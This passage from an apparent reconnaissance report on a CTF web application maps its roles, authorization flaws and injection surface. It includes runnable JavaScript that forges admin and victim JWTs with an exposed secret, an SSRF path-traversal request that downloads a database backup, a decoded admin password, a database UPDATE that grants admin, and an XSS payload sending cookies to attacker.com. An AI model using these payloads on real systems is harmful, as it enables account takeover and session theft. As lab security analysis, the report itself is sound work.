┌─────────────────────────────────────────────────────────────┐
│ Level 5: Master Admin (isMaster=1)                          │
│ - All standard user access                                   │
│ - FLAG visibility on profile page                            │
│ - No additional endpoints (role only affects flag display)   │
│ - No admin panel or user management interface                │
└─────────────────────────────────────────────────────────────┘
```

**Privilege Escalation Paths:**
1. **Vertical Escalation (User → Admin):**
   - JWT forgery with `uid=9666` using exposed secret
   - Database modification (`UPDATE users SET isMaster=1`)
   - SSRF → Database backup → Password reversal → Login as admin
   - Session hijacking via XSS (missing httpOnly flag)

2. **Horizontal Escalation (User A → User B):**
   - JWT forgery with different `uid` using exposed secret
   - No object ownership validation on `/api/user` endpoint

**Parallel Isolation:** None - single linear hierarchy

**Role Switching Mechanisms:**
- ❌ No impersonation feature
- ❌ No sudo mode
- ❌ No temporary privilege elevation
- ❌ No role delegation

**Note:** The privilege model is extremely simple - a binary flag with no granular permissions, capability tokens, or fine-grained access control.

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| Anonymous | `/` | `/`, `/team`, `/adminpanel` (login only), `/api/auth`, `/api/s3/*`, `/logout` | None |
| Standard User | `/adminpanel/profile` (after login) | All anonymous routes + `/adminpanel/profile`, `/api/user` | JWT token in cookie (1hr expiry), validated via `checkSession()` |
| Master Admin | `/adminpanel/profile` (after login) | Same as Standard User (no additional routes) | Same as Standard User |

**Entry Point Details:**

**Anonymous User Journey:**
1. Lands on `/` (home page) - marketing content
2. Can browse `/team` page - public team directory
3. Clicks login → Navigates to `/adminpanel`
4. Submits credentials via LoginForm component
5. POST `/api/auth` with `{email, password}`
6. On success: Receives JWT token, stored in cookie
7. Redirected to `/adminpanel/profile`

**Authenticated User Journey:**
1. Browser automatically sends `token` cookie with requests
2. Protected pages call `checkSession(token)` server action
3. Server action makes internal `GET /api/user?token=...` request
4. Token validated, user data retrieved from database
5. `isMaster` flag determines flag visibility
6. User sees profile page with or without flag

**Admin Distinguishing Feature:**
- Only difference: Flag display on profile page
- No separate admin dashboard
- No admin-only routes
- No user management interface

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|------------------|
| Anonymous | None | None | N/A (absence of token) |
| Standard User | Session check (inline): `/frontend/app/adminpanel/profile/page.tsx:7-12` | `if(session.error) redirect("/adminpanel")` | JWT cookie (`token`), Database field `isMaster=0` |
| Master Admin | Same as Standard User | `{props.isMaster && <p>{flag}</p>}` at `/frontend/app/components/Profile.tsx:39-40` | JWT cookie (`token`), Database field `isMaster=1` |

**Code Implementation Breakdown:**

**1. Role Storage (Database):**
- **File:** `/frontend/db/manapool.db`
- **Table:** `users`
- **Field:** `isMaster` (INTEGER: 0 or 1)
- **Access:** Direct file read via SQLite driver

**2. Role Retrieval (Database Query):**
- **Function:** `fetchUser(userId: string)`
- **File:** `/frontend/app/db/sqlite.tsx:47-59`
- **Query:** `SELECT * FROM users WHERE uid = ?`
- **Returns:** User object including `isMaster` field
- **Called From:** `/frontend/pages/api/user.ts:35`

**3. Session Validation (Server Action):**
- **Function:** `checkSession(token: string)`
- **File:** `/frontend/app/actions/sessionManager.ts:7-17`
- **Logic:** Internal fetch to `/api/user?token=...`
- **Returns:** User data with `isMaster` or error object
- **Called From:**
  - `/frontend/app/adminpanel/page.tsx:8`
  - `/frontend/app/adminpanel/profile/page.tsx:8`

**4. JWT Token Validation (API Endpoint):**
- **Endpoint:** `GET /api/user`
- **File:** `/frontend/pages/api/user.ts:16-59`
- **Validation:** `jwt.verify(token, secret)` (line 31)
- **Database Lookup:** `fetchUser(decodedToken.uid)` (line 35)
- **Response:** `{user: {name, email, amount, isMaster}, error: null}`

**5. Authorization Enforcement (React Component):**
- **Component:** Profile
- **File:** `/frontend/app/components/Profile.tsx:37-41`
- **Check:** Client-side conditional rendering
- **Code:**
  ```tsx
  {props.isMaster && <p className="flag__is__here text-green-400">{flag}</p>}
  {!props.isMaster && <p className="flag__is__here text-red-400">Access denied.</p>}
  ```
- **Vulnerability:** Authorization logic in UI component, not middleware

**Critical Missing Implementation:**
- ❌ No Next.js middleware file (`/middleware.ts`) for route protection
- ❌ No API route middleware for centralized auth checks
- ❌ No role-based access control (RBAC) library
- ❌ No permission decorators or guards
- ❌ No server-side authorization before rendering flag

**Authorization Architecture Flaw:**

Current flow (vulnerable):
```
JWT → /api/user → Database → {isMaster} → React Component → Flag Display
```

The application trusts the `isMaster` value from the API response without re-verifying on the server before rendering the flag. This creates a trust boundary vulnerability where manipulation of the API response or JWT forgery can bypass authorization.

Correct flow should be:
```
JWT → Verify on Server → Check isMaster in DB → Render Flag (or Deny)
```

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Attack Vector |
|----------|------------------|---------------------|-----------|-------------|---------------|
| HIGH | `GET /api/user?token={jwt}` | `uid` (in JWT payload) | user_data | PII, role flags, balance | Forge JWT with different `uid` using exposed secret (`2kI0Zu7N6ptVPDurCTfqBGVCd+qpaSFO6m4/20SCZQU=`). Access any user's profile data by changing uid claim. No ownership validation between JWT uid and requested data. **File:** `/frontend/pages/api/user.ts:35` |
| MEDIUM | `GET /adminpanel/profile` | Implicit `uid` (from cookie JWT) | user_data + flag | Highly sensitive (flag) | Forge JWT with admin's `uid=9666` to access admin profile. Flag displayed if forged JWT contains admin uid. **File:** `/frontend/app/adminpanel/profile/page.tsx:14-19` |

**IDOR Testing Notes:**
- No explicit object ID parameters in URLs (e.g., `/users/123`)
- Object ownership is implicit through JWT uid claim
- **Attack Method:** JWT forgery, not URL manipulation
- **Required:** JWT secret (already exposed in `.env`)

**Example Attack:**
```javascript
import jwt from 'jsonwebtoken';
const secret = "2kI0Zu7N6ptVPDurCTfqBGVCd+qpaSFO6m4/20SCZQU=";

// Horizontal escalation: Access another user's data
const victimToken = jwt.sign({uid: "3789"}, secret, {expiresIn: '1h'}); // Nayla Sanches
// Use victimToken to call /api/user

// Vertical escalation: Access admin's data
const adminToken = jwt.sign({uid: "9666"}, secret, {expiresIn: '1h'}); // William Rogers
// Use adminToken to access /adminpanel/profile and view flag
```

### 8.2 Vertical Privilege Escalation Candidates

| Target Role | Endpoint Pattern | Functionality | Risk Level | Attack Vector |
|-------------|------------------|---------------|------------|---------------|
| Master Admin | `/adminpanel/profile` | View CTF flag | **CRITICAL** | 1) JWT forgery with `uid=9666` using exposed secret, 2) SSRF to access database backup → Decode Base64 password → Login as admin, 3) Direct database modification (if filesystem access gained) |
| Master Admin | `GET /api/user?token={admin_jwt}` | Retrieve admin user data | HIGH | Forge JWT with admin uid, retrieve full admin profile including email, balance, and `isMaster=1` flag |

**Privilege Escalation Paths (Detailed):**

**Path 1: JWT Secret Forgery (HIGH Probability)**
1. **Obtain Secret:** Read `/frontend/.env:1` from repository
2. **Craft Payload:** `{uid: "9666"}` (admin uid)
3. **Sign Token:** Use `jsonwebtoken` library with exposed secret
4. **Inject Token:** Set forged token in browser cookie: `Cookies.set("token", forgedToken)`
5. **Access Flag:** Navigate to `/adminpanel/profile`
6. **Result:** Flag displayed (Profile.tsx checks `isMaster=1` from database)

**Path 2: SSRF → Database Backup → Credential Reversal (HIGH Probability)**
1. **Exploit SSRF:** `GET /api/s3/../backups/manapool.db`
2. **Download Backup:** Full SQLite database retrieved
3. **Query Database:** `SELECT password FROM users WHERE isMaster=1`
4. **Decode Password:** Base64 decode `Tm9FTlZNeGpHSzNOM2tH` → `NoENVMxjGK3N3kG`
5. **Login Legitimately:** POST `/api/auth` with `{email: "will.rogers@manapool.com", password: "NoENVMxjGK3N3kG"}`
6. **Access Flag:** Authenticated as admin, navigate to `/adminpanel/profile`

**Path 3: Direct Database Modification (Requires Filesystem Access)**
1. **Gain Shell Access:** Via container escape, RCE, or other vulnerability
2. **Modify Database:** `sqlite3 /app/db/manapool.db "UPDATE users SET isMaster=1 WHERE uid='<victim_uid>'"`
3. **Login as Victim:** Use victim's credentials (or any authenticated session)
4. **Access Flag:** `isMaster=1` now set, flag visible

**Path 4: XSS → Session Hijacking (Requires XSS Vulnerability)**
1. **Find XSS:** (Not found in current analysis, but missing CSP makes exploitation easy)
2. **Inject Payload:** `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
3. **Steal Admin Token:** Admin visits malicious page, token exfiltrated
4. **Use Stolen Token:** Set stolen token in attacker's browser
5. **Access Flag:** Token valid for up to 1 hour

**Endpoints Requiring Admin (isMaster=1):**
- `/adminpanel/profile` - Only endpoint where admin privilege matters (flag visibility)
- No other admin-only routes exist

**Note:** The application has minimal vertical separation - only one endpoint distinguishes between user and admin roles.

### 8.3 Context-Based Authorization Candidates

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Notes |
|----------|----------|---------------------|------------------|-------|
| Login Required | `/adminpanel/profile` | Valid JWT token in cookie | LOW | Session check implemented via `checkSession()` server action at `/frontend/app/adminpanel/profile/page.tsx:8`. Redirects to `/adminpanel` if `session.error` exists. Bypass requires JWT forgery. |
| Authentication | `/api/user` | Valid JWT token in query parameter | MEDIUM | Token validated via `jwt.verify()` at `/frontend/pages/api/user.ts:31`. Bypass requires knowing JWT secret or exploiting verification logic. |

**Context-Based Workflow Analysis:**

The application has **minimal multi-step workflows**. Most functionality is single-step:
- Login: One-step (POST credentials → Get token)
- View Profile: One-step (GET with token cookie)
- Logout: One-step (Remove cookie)

**No Multi-Step Workflows Found:**
- ❌ No registration flow
- ❌ No password reset workflow
- ❌ No email verification
- ❌ No multi-factor authentication
- ❌ No checkout/payment flow
- ❌ No onboarding wizard
- ❌ No approval workflows

**Session State Validation:**
- **Token Expiration:** JWT expires after 1 hour (enforced via `jwt.verify()`)
- **Token Revocation:** None (client-side logout only)
- **Session Fixation:** Not vulnerable (token generated server-side)
- **Session State:** Stateless JWT (no server-side session store)

**Workflow Bypass Opportunities:**
- **Login Bypass:** Forge JWT without authentication (requires secret)
- **Authorization Bypass:** Forge JWT with admin uid (requires secret)
- **Logout Bypass:** Reuse token after logout (no revocation mechanism)

---

## 9. Injection Sources (Command Injection and SQL Injection)

### SQL Injection Sources

**Result:** ✅ **ZERO SQL Injection vulnerabilities found**

All database queries in the application use **parameterized prepared statements**, which properly separate SQL query structure from user data. The application correctly implements SQL injection prevention across all network-accessible endpoints.

**Database Queries Analyzed:**

**1. Authentication Query (POST `/api/auth`)**
- **Data Flow:**
  - Input: `email` and `password` from request body
  - Sanitization: `xss()` + `validator.normalizeEmail()` for email, `xss()` + `validator.escape()` + Base64 encoding for password
  - Sink: `/frontend/app/db/sqlite.tsx:38-40`
  ```typescript
  const query = "SELECT * FROM users WHERE email = ? AND password = ?";
  const stmt = await db.prepare(query);
  const user = await stmt.all(credentials.email, credentials.password);
  ```
- **Protection:** Parameterized query with placeholder binding (`?`)
- **File:** `/frontend/app/db/sqlite.tsx:35-45` (signIn function)
- **SQL Injection Risk:** ✅ **NONE** (parameterized)

**2. User Data Retrieval Query (GET `/api/user`)**
- **Data Flow:**
  - Input: `token` from query parameter
  - Processing: JWT verification extracts cryptographically signed `uid`
  - Sink: `/frontend/app/db/sqlite.tsx:50-52`
  ```typescript
  const query = "SELECT * FROM users WHERE uid = ?";
  const stmt = await db.prepare(query);
  const result = await stmt.all(userId);
  ```
- **Protection:** Parameterized query + JWT signature verification (double protection)
- **File:** `/frontend/app/db/sqlite.tsx:47-59` (fetchUser function)
- **SQL Injection Risk:** ✅ **NONE** (parameterized + JWT validation)

**3. Database Initialization Query**
- **Query:** `SELECT * FROM users;` (static, no user input)
- **File:** `/frontend/app/db/sqlite.tsx:30`
- **Purpose:** Connection health check (unnecessary, performance issue only)
- **SQL Injection Risk:** ✅ **NONE** (no user input)

**SQL Injection Prevention Techniques Observed:**
- ✅ Consistent use of prepared statements across all queries
- ✅ Placeholder binding with `?` parameters
- ✅ No string concatenation in SQL queries
- ✅ No template literals for dynamic SQL
- ✅ sqlite3 library's `.prepare()` and `.all()` methods used correctly

### Command Injection Sources

**Result:** ✅ **ZERO Command Injection vulnerabilities found**

The application does not execute any system commands. Comprehensive code analysis revealed:

**Command Execution Functions Searched:**
- `child_process.exec` - Not found
- `child_process.execSync` - Not found
- `child_process.spawn` - Not found
- `child_process.spawnSync` - Not found
- `child_process.fork` - Not found
- `require('child_process')` - Not found

**Files Analyzed:**
- All 16 TypeScript/JavaScript files in `/frontend` directory
- All 3 API route handlers in `/frontend/pages/api`
- S3 service implementation in `/s3/s3.js`
- Database layer in `/frontend/app/db/sqlite.tsx`

**Potential False Positive Investigated:**

**GET `/api/s3/[slug]` Endpoint:**
- **User Input:** `slug` parameter from URL path
- **Processing:** Extracted via `req.url?.split("/").reverse()[0]`
- **Sink:** `fetch(\`http://s3:8333/assets/${image}\`)` (line 11)
- **Analysis:** This is an **HTTP request**, not command execution
- **Vulnerability Class:** Server-Side Request Forgery (SSRF), NOT command injection
- **File:** `/frontend/pages/api/s3/[slug].ts:7-11`
- **Command Injection Risk:** ✅ **NONE** (HTTP fetch, not shell command)

**S3 Service Analysis:**
- **Technology:** s3rver library v3.7.1 (S3-compatible API server)
- **File:** `/s3/s3.js`
- **Implementation:** Uses s3rver's built-in file operations
- **Command Execution:** None found in s3rver library or custom code
- **Command Injection Risk:** ✅ **NONE**

### Vulnerability Sources by Type (Network-Accessible Only)

#### 1. SQL Injection Sources: **NONE**

All database queries use parameterized prepared statements.

#### 2. Command Injection Sources: **NONE**

No command execution functionality exists in the application.

#### 3. Server-Side Request Forgery (SSRF) Sources: **1 CRITICAL**

**SSRF Vulnerability in `/api/s3/[slug]`:**
- **File:** `/frontend/pages/api/s3/[slug].ts:7-11`
- **Input Vector:** `slug` path parameter
- **Extraction:** `const image = req.url?.split("/").reverse()[0];`
- **Dangerous Sink:** `const response = await fetch(\`http://s3:8333/assets/${image}\`);`
- **Validation:** ❌ **NONE** - No input sanitization, no path traversal prevention, no allowlist
- **Exploit:** `GET /api/s3/../backups/manapool.db` accesses database backup
- **Impact:** Can access internal services, database backups, potentially internal APIs

**Data Flow:**
```
User Request: GET /api/s3/../backups/manapool.db
      ↓
req.url extraction (line 7): image = "../backups/manapool.db"
      ↓
Interpolation (line 11): fetch("http://s3:8333/assets/../backups/manapool.db")
      ↓
S3 Service: Resolves path to /backups/manapool.db
      ↓
Response: Database file returned to attacker
```

**Mitigation Missing:**
- ❌ No input validation (regex, allowlist, type checking)
- ❌ No path traversal prevention (`../` sequences not blocked)
- ❌ No URL encoding/normalization
- ❌ No destination allowlist (should only allow s3:8333/assets/*)

### Summary

| Injection Type | Count | Severity | Locations | Protection Status |
|----------------|-------|----------|-----------|-------------------|
| SQL Injection | 0 | N/A | All queries parameterized | ✅ Protected |
| Command Injection | 0 | N/A | No command execution | ✅ Not Applicable |
| SSRF | 1 | 🔴 CRITICAL | `/api/s3/[slug].ts:11` | ❌ Unprotected |

**Key Findings:**
- The application has **excellent SQL injection prevention** through consistent use of parameterized queries
- There is **no command injection attack surface** (no system command execution)
- The **critical SSRF vulnerability** in the S3 proxy endpoint is the primary injection-related risk
- This SSRF enables access to sensitive internal resources including the unencrypted database backup

---

## Conclusion

This reconnaissance analysis reveals a **critically vulnerable application** with a well-defined but poorly defended attack surface. While the application correctly prevents SQL injection through parameterized queries, it suffers from fundamental authentication and authorization failures that create multiple high-probability paths to compromise.

**Critical Attack Paths to Flag:**
1. **JWT Forgery** (Highest Probability) - Use exposed secret to forge admin token
2. **SSRF → Database Backup** (High Probability) - Access backup, decode passwords, login as admin
3. **Direct Credential Reversal** (Medium Probability) - Obtain database, decode Base64 passwords

**Next Steps for Analysis Teams:**
- **Injection Specialist:** Focus on SSRF vulnerability exploitation paths
- **XSS Specialist:** Investigate client-side rendering, missing CSP headers
- **Auth Specialist:** Analyze JWT forgery, session hijacking opportunities
- **Authz Specialist:** Test horizontal/vertical privilege escalation via JWT manipulation
- **SSRF Specialist:** Map internal network, enumerate services, access backup files

**RECONNAISSANCE COMPLETE**